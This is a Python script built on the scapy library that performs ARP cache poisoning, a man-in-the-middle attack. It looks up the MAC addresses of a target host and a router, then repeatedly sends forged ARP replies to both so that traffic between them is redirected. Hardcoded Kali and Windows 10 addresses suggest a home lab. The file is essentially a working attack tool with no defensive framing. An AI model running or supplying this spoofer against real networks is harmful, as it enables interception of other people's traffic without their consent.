import sys
import os
import time

display = os.environ.get("DISPLAY")
if display:
    print(f"{display}")
else:
    print("DISPLAY not set, setting...")
    os.environ["DISPLAY"] = ":0.0"
import scapy.all as scapy

if len(sys.argv) < 3:
    target_ip = input("[+] Enter target ip address: ")
    router_ip = input("[+] Enter router ip address: ")
elif len(sys.argv) == 3:
    target_ip, router_ip = sys.argv[1:]
else:
    print(f"syntax {sys.argv[0]} target_ip router_ip")
    exit()

print(f"target ip: {target_ip}")
print(f"router ip: {router_ip}")

BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"

KALI_IP = "192.168.1.195"
KALI_MAC = "08:00:27:80:a4:72"

W10_IP = "192.168.1.10"
W10_MAC = "90:E6:BA:46:95:5E"

ROUTER_IP = "192.168.1.254"
ROUTER_MAC = "84:26:15:f9:16:44"


def get_mac_address(ip_address):
    broadcast_layer = scapy.Ether(dst=BROADCAST_MAC)
    # output = broadcast_layer.show(dump=True)
    # print(f"broadcast_layer:\n{output}")

    arp_layer = scapy.ARP(pdst=ip_address)
    # output = arp_layer.show(dump=True)
    # # print(f"arp_layer:\n{output}")

    get_mac_packet = broadcast_layer / arp_layer
    # output = get_mac_packet.show(dump=True)
    # print(f"get_mac_packet:\n{output}")

    answer, unanswer = scapy.srp(get_mac_packet, timeout=2, verbose=False)
    print(f"answer: {answer}")
    sent, received = answer[0]
    # output = sent.show(dump=True)
    # print(f"sent:\n{output}")
    # output = received.show(dump=True)
    # print(f"received:\n{output}")
    return received.hwsrc


def spoof(router_ip, target_ip, router_mac, target_mac):
    router_packet = scapy.ARP(
        op=2,
        psrc=target_ip,
        hwdst=router_mac,
        pdst=router_ip,
    )
    output = router_packet.show(dump=True)
    print("router spoof packet")
    print(output)

    target_packet = scapy.ARP(
        op=2,
        psrc=router_ip,
        hwdst=target_mac,
        pdst=target_ip,
    )
    output = target_packet.show(dump=True)
    print("router spoof packet")
    print(output)

    scapy.send(router_packet)
    scapy.send(target_packet)


target_mac = get_mac_address(target_ip)
router_mac = get_mac_address(router_ip)

print(f"target: ip={target_ip}, mac={target_mac}")
print(f"router: ip={router_ip}, mac={router_mac}")

spoof(router_ip, target_ip, router_mac, target_mac)

try:
    print("START spoof loop")
    while True:
        spoof(router_ip, target_ip, router_mac, target_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print('STOP spoof loop')
    exit(0)
